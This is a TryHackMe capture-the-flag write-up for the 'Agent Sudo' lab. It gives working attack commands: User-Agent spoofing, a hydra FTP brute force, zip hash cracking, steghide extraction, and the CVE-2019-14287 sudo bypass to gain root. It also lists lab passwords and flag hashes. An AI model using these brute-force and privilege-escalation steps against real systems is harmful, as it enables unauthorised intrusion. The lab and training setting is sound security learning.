TryHackMe: Agent Sudo Write-up
1. Details of the Event
• Room: Agent Sudo

• Difficulty: Easy

• Objective: Infiltrate the deep-sea server and reveal the truth.

---

2. Vulnerability Discovery
I performed an initial port scan to identify the attack surface: `rustscan -a <IP_ADDRESS>`

Open Ports:

• `21/tcp` (FTP): `vsftpd 3.0.3`

• `22/tcp` (SSH): `OpenSSH 7.6p1`

• `80/tcp` (HTTP): `Apache httpd 2.4.29`

Web Hint: Port 80 displayed a message from Agent R: "Use your own codename as user-agent to access the site."

---

3. Exploitation
Step 1: User-Agent Bypass

I intercepted the HTTP request and modified the `User-Agent` header.

• Codename: `C`

• Result: Redirected to `agent_C_attention.php`.

• Discovery: Agent C is `chris` and has a "weak password."

Step 2: FTP Brute Force

Used `hydra` to crack Chris's FTP access: `hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://<IP_ADDRESS>`

• Password Found: `crystal`

Step 3: Steganography (Layer 1)

Downloaded 3 files from FTP: `To_agentJ.txt`, `cutie.png`, and `cute-alien.jpg`. Analyzing `cutie.png` with `binwalk`: `binwalk -e cutie.png`

• Discovery: A hidden Zip archive containing `To_agentR.txt`.

• Cracking Zip:

  1. `zip2john 8702.zip > hash.txt`

  2. `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

• Zip Password: `alien`

Step 4: Steganography (Layer 2)

Inside the Zip, a message contained the Base64 string `QXJlYTUx`. `echo 'QXJlYTUx' | base64 -d` -> `Area51`

Used `Area51` as the passphrase for `cute-alien.jpg`: `steghide extract -sf cute-alien.jpg`

• Discovery: `message.txt` revealed SSH credentials for `james`.

• SSH Password: `hackerrules!`

---

4. Privilege Escalation
User Flag

`ssh james@<IP_ADDRESS>`

• Flag: `b03d975e8c92a7c04146cfa7a5a313c7`

Root Flag (CVE-2019-14287)

Checking permissions: `sudo -l`

• Output: `(ALL, !root) /bin/bash`

• Version: `sudo -V` -> `1.8.21p2`

This version allows a Security Bypass. By requesting UID `-1`, the system fails to block `root` access. The Exploit: `sudo -u#-1 /bin/bash`

• Root Flag: `b53a02f55b57d4439e3341834d70c062`

---

5. Takeaways
• Enumeration is Key: The User-Agent hint was the only way into the web app.

• Stego Chains: Files can be hidden inside files (Image > Zip > Text). Tools like `binwalk` and `steghide` are mandatory.

• Configuration Logic: `(ALL, !root)` is a dangerous configuration on older `sudo` versions. Always check `sudo -V`.
